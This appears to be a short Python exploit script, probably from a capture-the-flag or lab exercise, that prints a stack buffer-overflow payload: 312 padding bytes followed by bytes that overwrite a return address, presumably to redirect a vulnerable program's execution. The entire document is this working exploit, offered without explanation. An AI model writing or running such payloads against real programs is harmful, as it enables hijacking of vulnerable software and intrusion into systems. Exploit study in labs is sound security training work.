import sys

payload = b'A' * 312 + b'\xe8\x04\x01' + b'\n'
sys.stdout.buffer.write(payload)
